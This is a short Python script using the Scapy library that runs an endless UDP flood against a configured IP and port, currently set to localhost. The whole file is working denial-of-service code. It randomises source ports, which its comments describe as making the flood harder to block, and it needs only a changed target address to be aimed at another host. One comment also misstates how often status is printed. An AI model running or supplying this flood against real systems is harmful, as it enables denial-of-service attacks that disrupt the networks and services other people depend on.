from scapy.all import IP, UDP, send, RandShort
import time
import sys

# --- Configuration ---
target_ip = "127.0.0.1"  # Target is your own machine (localhost)
target_port = 80         # A common port like HTTP
packet_count = 0

print(f"🚀 Starting UDP Flood against {target_ip}:{target_port}.")
print("Press Ctrl+C to stop the attack.")

# --- The Attack Loop ---
while True:
    try:
        # Craft a packet with a random source port to make it harder to block
        packet = IP(dst=target_ip) / UDP(sport=RandShort(), dport=target_port) / "ATTACK_PAYLOAD"
        
        # Send the packet without printing anything to the screen
        send(packet, verbose=0)
        
        packet_count += 1
        # Print status update every 100 packets
        sys.stdout.write(f"\rPackets Sent: {packet_count}")
        sys.stdout.flush()

    except KeyboardInterrupt:
        print("\n🛑 UDP Flood stopped.")
        break